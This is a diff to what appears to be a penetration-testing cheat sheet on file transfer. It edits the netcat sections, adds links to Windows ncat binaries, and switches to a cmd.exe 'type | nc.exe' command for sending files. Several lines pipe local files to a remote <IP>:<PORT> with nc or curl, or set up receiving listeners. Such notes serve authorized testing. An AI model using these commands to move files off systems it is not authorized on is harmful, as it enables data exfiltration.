@@ -62,13 +62,17 @@ http-server -a <IP> -p <PORT> --cors --usernmae <USERNAME> --password <PASSWORD>
 curl -F 'data=@<FILE>' http://<IP>:<PORT>
 ```
 
-###### [Linux / Windows] nc
+###### [Linux / Windows] netcat
 
 ```
 # Needs the receiver to be listening
+
 nc -w 3 <IP> <PORT> < <FILE>
 
-Get-Content <FILE> | ./nc.exe -w 3 <IP> <PORT>
+# The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe or https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip offer a better compatibility across Windows systems
+# Use of PowerShell's Get-Content, and its alias (cat, type, gc, etc.), may induce a corrupted file.
+
+cmd.exe /c 'type <FILE> | ./nc.exe -w 3 <IP> <PORT>'
 ```
 
 ###### [Linux] socat
@@ -238,6 +242,8 @@ curl -O http://<IP>:<PORT>/<FILE>
 
 ```bash
 # To be started before the transfer request is made server-side
+# The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe or https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip offer a better compatibility across Windows systems
+
 nc -lvnp <PORT> > <OUTPUT_FILE>
 nc -lvnp <PORT> | tee <OUTPUT_FILE>
 ```
